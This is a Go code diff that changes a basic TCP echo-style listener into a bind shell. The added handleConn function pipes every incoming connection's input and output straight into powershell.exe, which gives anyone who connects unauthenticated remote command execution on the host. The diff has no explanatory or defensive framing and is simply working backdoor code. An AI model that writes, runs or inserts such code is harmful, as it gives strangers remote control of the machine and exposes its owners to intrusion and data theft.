@@ -4,7 +4,28 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"os/exec"
 )
+
+func handleConn(conn net.Conn) {
+	defer conn.Close()
+
+	cmd := exec.Command("powershell.exe", "-Command -")
+
+	cmd.Stdin = conn
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+
+	if err := cmd.Start(); err != nil {
+		panic(err)
+	}
+
+	if err := cmd.Wait(); err != nil {
+		panic(err)
+	}
+
+	fmt.Fprintf(os.Stderr, "Connection closed\n")
+}
 
 func main() {
 	// create listening socket
@@ -18,9 +39,6 @@ func main() {
 	// below line will run when main returns
 	defer ln.Close()
 
-	// create common buffer
-	buffer := make([]byte, 1024)
-
 	// accept connections one by one
 	for {
 		// accept new connection
@@ -31,18 +49,7 @@ func main() {
 			continue
 		}
 
-		n, err := conn.Read(buffer)
-
-		if err != nil {
-			fmt.Fprintf(os.Stderr, "Error: %s\n", err.Error())
-			continue
-		}
-
-		fmt.Fprintf(os.Stderr, "Read %d bytes\nData: %s", n, string(buffer[:n]))
-
-		conn.Write([]byte("Thanks for message\n"))
-
-		conn.Close()
+		go handleConn(conn)
 	}
 
 }
